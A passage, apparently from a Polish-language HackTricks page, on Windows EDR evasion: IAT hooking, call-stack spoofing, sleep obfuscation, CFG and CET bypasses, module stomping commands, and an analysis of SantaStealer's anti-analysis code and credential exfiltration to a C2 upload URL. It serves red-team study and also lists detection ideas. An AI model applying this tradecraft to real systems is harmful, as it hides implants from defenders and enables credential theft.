- Umieść PIC blob obok modułu docelowego, używając reflective loadera (prepended lub companion). PIC musi być samowystarczalny i position‑independent.
- Gdy host DLL się ładuje, przejdź po jego IMAGE_IMPORT_DESCRIPTOR i załatkuj wpisy IAT dla docelowych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed tail-calling do rzeczywistego adresu API. Typowe evasion obejmują:
- Memory mask/unmask wokół wywołania (np. szyfrowanie regionów beacon, RWX→RX, zmiana nazw/uprawnień stron), a potem przywrócenie stanu po wywołaniu.
- Call-stack spoofing: zbudowanie benign stack i przejście do docelowego API tak, aby analiza call-stack wskazywała oczekiwane ramki.
- Dla kompatybilności wyeksportuj interfejs, aby skrypt Aggressor (lub odpowiednik) mógł rejestrować, które API mają być hookowane dla Beacon, BOFs i post-ex DLL.

Dlaczego tutaj IAT hooking
- Działa dla każdego kodu, który używa hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na tym, że Beacon będzie proxy’ować konkretne API.
- Obejmuje post-ex DLL: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować to samo maskowanie/evasion stack do ich wywołań API.
- Przywraca niezawodne użycie poleceń post-ex uruchamiających procesy przeciwko wykrywaniu opartemu na call-stack przez owijanie CreateProcessA/W.

Minimalny szkic IAT hooka (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Zastosuj patch po relocations/ASLR i przed pierwszym użyciem importu. Reflective loaders takie jak TitanLdr/AceLdr pokazują hookowanie podczas `DllMain` załadowanego modułu.
- Trzymaj wrappery małe i PIC-safe; rozwiąż prawdziwe API przez oryginalną wartość IAT, którą przechwyciłeś przed patchowaniem, albo przez `LdrGetProcedureAddress`.
- Używaj przejść RW → RX dla PIC i nie zostawiaj stron writable+executable.

Call‑stack spoofing stub
- Stuby PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu do benign modules), a potem pivotują do prawdziwego API.
- To omija detekcje, które oczekują kanonicznych stacków z Beacon/BOFs do wrażliwych API.
- Połącz to z technikami stack cutting / stack stitching, aby wylądować wewnątrz oczekiwanych ramek przed prologiem API.

Integracja operacyjna
- Dodaj reflective loader na początek post-ex DLLs, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL.
- Użyj skryptu Aggressor, aby zarejestrować docelowe API, tak by Beacon i BOFs transparentnie korzystały z tej samej ścieżki evasion bez zmian w kodzie.

Uwagi detekcyjne/DFIR
- Integralność IAT: wpisy rozwiązujące się do adresów non-image (heap/anon); okresowa weryfikacja import pointers.
- Anomalie stacka: adresy powrotu nie należące do załadowanych obrazów; nagłe przejścia do non-image PIC; niespójne ancestry `RtlUserThreadStart`.
- Telemetria loadera: zapisy do IAT w procesie, wczesna aktywność `DllMain` modyfikująca import thunks, nieoczekiwane regiony RX tworzone przy load.
- Image-load evasion: jeśli hookujesz `LoadLibrary*`, monitoruj podejrzane ładowania automation/clr assemblies skorelowane z eventami memory masking.

Powiązane building blocks i przykłady
- Reflective loaders, które wykonują IAT patching podczas load (np. TitanLdr, AceLdr)
- Memory masking hooks (np. simplehook) i PIC stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik `GetProcAddress` loadera niestandardowym resolverem, który najpierw sprawdza hooki:

- Zbuduj **resident PICO** (persistent PIC object), który przetrwa po zwolnieniu transient loader PIC.
- Wyeksportuj funkcję `setup_hooks()`, która nadpisuje import resolver loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj ordinal imports i użyj lookup hooków opartych o hash, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie deleguj do prawdziwego `GetProcAddress`.
- Zarejestruj cele hooków w czasie linkowania przez wpisy Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje ważny, ponieważ znajduje się wewnątrz resident PICO.

Daje to **import-time IAT redirection** bez patchowania sekcji kodu załadowanego DLL po load.

### Wymuszanie hookowalnych importów, gdy target używa PEB-walking

Import-time hooki zadziałają tylko wtedy, gdy funkcja faktycznie znajduje się w IAT targetu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (brak wpisu importu), wymuś prawdziwy import, aby ścieżka `ProcessImports()` loadera go zobaczyła:

- Zastąp hashed export resolution (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, np. `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, co umożliwi interception, gdy reflective loader rozwiązuje importy.

### Ekko-style sleep/idle obfuscation bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste primitive wait/IPC**, których używa implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Dla długich waitów opakuj wywołanie w łańcuch obfuscation w stylu Ekko, który szyfruje obraz w pamięci podczas idle:

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi frame `CONTEXT`.
- Typowy chain (x64): ustaw obraz na `PAGE_READWRITE` → zaszyfruj RC4 przez `advapi32!SystemFunction032` na całym zmapowanym obrazie → wykonaj blocking wait → odszyfruj RC4 → **przywróć per-section permissions** przez przejście po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy krok.

Szczegół operacyjny: zwracaj „success” dla długich waitów (np. `WAIT_OBJECT_0`), aby caller kontynuował, podczas gdy obraz jest masked. Ten wzorzec ukrywa moduł przed skanerami podczas idle windows i unika klasycznego sygnaturu „patched `Sleep()`”.

Pomysły na detekcję (telemetry-based)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- `advapi32!SystemFunction032` używane na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` na dużym zakresie, a potem niestandardowe przywracanie uprawnień per-section.

### Runtime CFG registration dla sleep-obfuscation gadgets

Na targetach z CFG pierwszy pośredni skok do mid-function gadget, takiego jak `jmp [rbx]` albo `jmp rdi`, zwykle zakończy proces `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadget nie występuje w metadanych CFG modułu. Aby utrzymać chain w stylu Ekko/Kraken w hardened processes:

- Zarejestruj każdy pośredni destination używany przez chain za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` oraz wpisów `CFG_CALL_TARGET_VALID`.
- Dla adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **image base** i obejmować **pełny rozmiar obrazu**.
- Dla regions manually mapped/PIC/stomped użyj zamiast tego **allocation base** i rozmiaru alokacji.
- Oznacz nie tylko gadget dispatch, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall'e wait/event) oraz każdą kontrolowaną przez atakującego sekcję executable, która stanie się pośrednim celem.

To zamienia łańcuchy sleep w stylu ROP/JOP z „działa tylko w procesach bez CFG” w reusable primitive dla `explorer.exe`, browserów, `svchost.exe` i innych endpointów skompilowanych z `/guard:cf`.

### CET-safe stack spoofing dla sleeping threads

Pełna podmiana `CONTEXT` jest głośna i może się załamać na systemach CET Shadow Stack, ponieważ spoofed `Rip` nadal musi zgadzać się z hardware shadow stack. Bezpieczniejszy wzorzec sleep-masking to:

- Wybierz inny thread w tym samym procesie i odczytaj jego granice stacka `NT_TIB` / TEB (`StackBase`, `StackLimit`) przez `NtQueryInformationThread`.
- Zrób backup prawdziwego TEB/TIB bieżącego threadu.
- Złap prawdziwy sleeping context przez `GetThreadContext`.
- Skopiuj **tylko** prawdziwy `Rip` do spoof context, zostawiając spoofed `Rsp`/stan stacka bez zmian.
- Podczas okna sleep skopiuj `NT_TIB` spoofa do bieżącego TEB, aby stack walkerzy unwindowali w obrębie legalnego zakresu stacka.
- Po zakończeniu wait przywróć oryginalny TIB i thread context.

To zachowuje zgodny z CET instruction pointer, jednocześnie wprowadzając w błąd EDR stack walkers, które ufają metadanym stacka w TEB do walidacji unwindów.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch przez timer-queue jest zbyt podpisany, ten sam sequence sleep-encrypt-spoof-restore można wykonać z suspended helper thread przy użyciu queued APCs:

- Utwórz helper thread z `NtTestAlert` jako entrypoint.
- Queue przygotowane frame `CONTEXT`/APCs przez `NtQueueApcThread` i opróżnij je przez `NtAlertResumeThread`.
- Przechowuj stan chaina na heap, zamiast na stacku helpera, aby nie wyczerpać domyślnego 64 KB thread stack.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować event startowy i zablokować.
- Wstrzymaj main thread przed przywróceniem TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), aby zmniejszyć okno race, w którym skaner mógłby złapać pół-przywrócony stack.

To zamienia sygnaturę `CreateTimerQueueTimer` + `NtContinue` na sygnaturę helper-thread/APC, zachowując te same cele RC4 masking i stack-spoofing.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed sleep, wait lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` opakowane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread` a potem bezpośrednie zapisy do granic stacka bieżącego threadu w TEB/TIB.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio sięgają do `SystemFunction032`, `VirtualProtect` lub helperów przywracających permissions sekcji.
- Powtarzane użycie krótkich sygnatur gadgetów takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`) jako pivots dispatch w signed modules.


## Precision Module Stomping

Module stomping wykonuje payloads z **sekcji `.text` DLL już zmapowanego w procesie targetu** zamiast alokować oczywiste prywatne executable memory albo ładować świeżą sacrificial DLL. Cel nadpisania powinien być **załadowanym, disk-backed image**, którego przestrzeń kodu może wchłonąć payload bez uszkadzania ścieżek kodu, których proces nadal potrzebuje.

### Reliable target selection

Naive stomping przeciwko popularnym modułom takim jak `uxtheme.dll` czy `comctl32.dll` jest kruche: DLL może nie być załadowany w procesie zdalnym, a zbyt mały region kodu spowoduje crash procesu. Bardziej niezawodny workflow to:

1. Wylicz moduły target process i utrzymuj **names-only include list** DLL-i już załadowanych.
2. Zbuduj payload najpierw i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL-e na dysku i porównaj PE section **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. To ważniejsze niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji executable **po zmapowaniu do pamięci**.
4. Sparsuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako punkt startowy stomp.
5. Oblicz **blast radius**: jeśli payload przekroczy granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone po niej w pamięci.

Typowe helpery recon/selection widziane w praktyce:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Uwagi operacyjne
- Preferuj DLL-e **już załadowane** w zdalnym procesie, aby uniknąć telemetrii `LoadLibrary`/nieoczekiwanych image loads.
- Preferuj eksporty, które są rzadko wykonywane przez aplikację docelową, w przeciwnym razie normalne ścieżki kodu mogą trafić w stomped bytes przed lub po utworzeniu wątku.
- Duże implanty często wymagają zmiany osadzania shellcode z literału stringowego na **byte-array/braced initializer**, aby cały bufor był poprawnie reprezentowany w źródle injectora.

Pomysły na detekcję
- Zdalne zapisy do **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast bardziej typowych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie zgadzają się już z plikiem bazowym na dysku.
- Zdalne wątki lub pivoty kontekstu, które rozpoczynają wykonanie wewnątrz legalnego eksportu DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` skierowane na strony `.text` DLL, po których następuje utworzenie wątku.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) pokazuje, jak nowoczesne info-stealers łączą AV bypass, anti-analysis i dostęp do poświadczeń w jednym workflow.

### Keyboard layout gating & sandbox delay

- Flaga config (`anti_cis`) wylicza zainstalowane keyboard layouts za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony układ cyrylicki, próbka zapisuje pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealers, dzięki czemu nigdy nie detonuje na wykluczonych locale, jednocześnie zostawiając artefakt do huntingu.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Wariant A przechodzi po liście procesów, hashuje każdą nazwę za pomocą niestandardowej rolling checksum i porównuje ją z wbudowanymi blocklistami dla debuggerów/sandboxów; powtarza checksum również dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, recent uptime), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, oraz wykonuje timing checks wokół `sleep`, by wykrywać single-stepping. Każde trafienie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + podwójne ChaCha20 reflective loading

- Główny DLL/EXE osadza Chromium credential helper, który jest albo zapisywany na dysk, albo ręcznie mapowany w pamięci; tryb fileless samodzielnie rozwiązuje imports/relocations, więc żadne artefakty helpera nie są zapisywane.
- Ten helper przechowuje DLL drugiego etapu zaszyfrowany dwukrotnie ChaCha20 (dwa 32-byte keys + 12-byte nonces). Po obu przebiegach reflective loads blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Procedury ChromElevator używają direct-syscall reflective process hollowing, aby wstrzyknąć się do działającego Chromium browser, odziedziczyć klucze AppBound Encryption i odszyfrować hasła/cookies/credit cards bezpośrednio z baz SQLite mimo hardening ABE.

### Modularne zbieranie w pamięci i chunked HTTP exfil

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników funkcyjnych `memory_generators` i uruchamia jeden thread na każdy włączony moduł (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, browser extensions itd.). Każdy thread zapisuje wyniki do współdzielonych buforów i zgłasza liczbę plików po oknie join wynoszącym ~45s.
- Po zakończeniu wszystko jest pakowane biblioteką `miniz` statycznie linkowaną jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` śpi 15s i przesyła archiwum w chunkach po 10 MB przez HTTP POST do `http://<C2>:6767/upload`, podszywając się pod browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Każdy chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalnie `w: <campaign_tag>`, a ostatni chunk dopisuje `complete: true`, aby C2 wiedziało, że reassembly jest zakończone.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
